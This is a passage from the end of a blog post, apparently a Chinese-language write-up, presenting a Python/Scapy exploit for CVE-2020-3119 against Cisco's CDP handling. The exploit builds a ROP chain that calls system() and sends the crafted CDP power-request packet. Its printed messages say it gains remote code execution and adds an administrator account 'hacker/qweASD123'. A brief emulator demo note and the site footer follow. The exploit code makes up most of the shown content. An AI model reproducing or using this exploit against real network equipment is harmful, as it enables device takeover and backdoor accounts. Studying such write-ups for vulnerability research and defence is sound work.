</span></span><span style="display:flex;"><span>pop_eax_ret <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00021b07</span>         <span style="color:#75715e"># 0x00021b07 : pop eax ; ret</span>
</span></span><span style="display:flex;"><span>mov_pop_edi_ret <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x001434c2</span>     <span style="color:#75715e"># 0x001434c2 : mov eax, dword ptr [esp + 0xc] ; pop edi ; ret</span>
</span></span><span style="display:flex;"><span>add_eax_0xc_ret <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0010385a</span>     <span style="color:#75715e"># 0x0010385a : add eax, 0xc ; ret</span>
</span></span><span style="display:flex;"><span>push_eax_call_edi <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0001cb19</span>   <span style="color:#75715e"># 0x0001cb19 : push eax ; call edi</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>               <span style="color:#75715e"># Requist-ID: 0x0000, Management-ID: 0x0000</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;bbbb&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>             <span style="color:#75715e"># Power Request Entry x 16</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cccc&#34;</span>                  <span style="color:#75715e"># placeholder for saved ebp</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_edi_ret<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">&#39;big&#39;</span>)           <span style="color:#75715e"># pop out next unused parameter a1</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> (<span style="color:#ae81ff">0xf6809b10</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1204</span>)<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">&#39;big&#39;</span>)   <span style="color:#75715e"># 1st parameter : a1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> ret<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">&#39;big&#39;</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">7</span>               <span style="color:#75715e"># adjust the stack</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> mov_pop_edi_ret<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">&#39;big&#39;</span>)       <span style="color:#75715e"># mov eax, dword ptr [esp + 0xc] ; pop edi ; ret</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> system<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">&#39;big&#39;</span>)                <span style="color:#75715e"># addr(system) into edi</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> add_eax_0xc_ret<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">&#39;big&#39;</span>)       <span style="color:#75715e"># add eax, 0xc ; ret</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> push_eax_call_edi<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">&#39;big&#39;</span>)     <span style="color:#75715e"># shoot</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>power_req <span style="color:#f92672">=</span> cdp<span style="color:#f92672">.</span>CDPMsgUnknown19(val<span style="color:#f92672">=</span>payload)
</span></span><span style="display:flex;"><span>power_level <span style="color:#f92672">=</span> cdp<span style="color:#f92672">.</span>CDPMsgPower(power<span style="color:#f92672">=</span><span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>cdp_packet <span style="color:#f92672">=</span> cdp_header<span style="color:#f92672">/</span>deviceid<span style="color:#f92672">/</span>portid<span style="color:#f92672">/</span>address<span style="color:#f92672">/</span>cap<span style="color:#f92672">/</span>power_req<span style="color:#f92672">/</span>power_level
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(&#39;[+] try 256 times to see if we success ...&#39;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># for i in range(0x100):</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     print(&#39;\r[*] sending packet {} / 256&#39;.format(i + 1),end=&#39;&#39;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     sendp(ethernet/llc/cdp_packet)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     time.sleep(0.5)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;This payload exploit CVE-2020-3119 to gain RCE and add an administrator account&#39;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;username/pw: hacker/qweASD123&#39;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;we cannot determine whether our payload success or not in one shot&#39;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;because there is no interactive&#39;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;in reality, aslr is enabled, so we must try 256 times&#39;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;here demonstrate the situation without ASLR: we only need to send one packet&#39;</span>)
</span></span><span style="display:flex;"><span>sendp(ethernet<span style="color:#f92672">/</span>llc<span style="color:#f92672">/</span>cdp_packet)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;[+] done !&#39;</span>)
</span></span></code></pre></div><h1 id="效果演示">效果演示<a hidden class="anchor" aria-hidden="true" href="#效果演示">#</a></h1>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691992445/blog/CVE-2020-3119/CVE-2020-3119-exploit_vvduch.gif" alt=""  />
</p>
<h1 id="总结与感想">总结与感想<a hidden class="anchor" aria-hidden="true" href="#总结与感想">#</a></h1>
<ol>
<li>GNS3模拟器会不时地突然重启，比较迷惑，暂时认为是模拟器不稳定的问题。</li>
</ol>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691992445/blog/CVE-2020-3119/CVE-2020-3119-exploit_vvduch.gif" alt=""  />
</p>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="https://ainevsia.github.io/">Ainevsia Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
